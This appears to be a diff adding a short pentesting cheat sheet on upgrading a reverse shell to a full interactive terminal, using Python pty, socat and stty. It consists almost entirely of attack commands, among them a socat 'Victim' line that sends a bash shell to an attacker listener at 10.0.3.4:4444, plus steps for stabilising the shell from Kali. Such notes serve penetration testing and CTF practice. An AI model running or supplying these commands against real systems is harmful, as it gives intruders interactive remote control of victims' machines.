@@ -1,0 +1,40 @@
+Tags : #Cheatsheet #Shell 
+
+**Using Python**
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+
+**Using socat**
+
+
+```bash
+#Listener:
+socat file:`tty`,raw,echo=0 tcp-listen:4444
+
+#Victim:
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
+```
+
+
+
+**Using stty options**
+
+
+
+```bash
+# In reverse shell
+$ python -c 'import pty; pty.spawn("/bin/bash")'
+Ctrl-Z
+
+# In Kali
+$ stty raw -echo
+$ fg
+
+# In reverse shell
+$ reset
+$ export SHELL=bash
+$ export TERM=xterm-256color
+$ stty rows <num> columns <cols>
+```
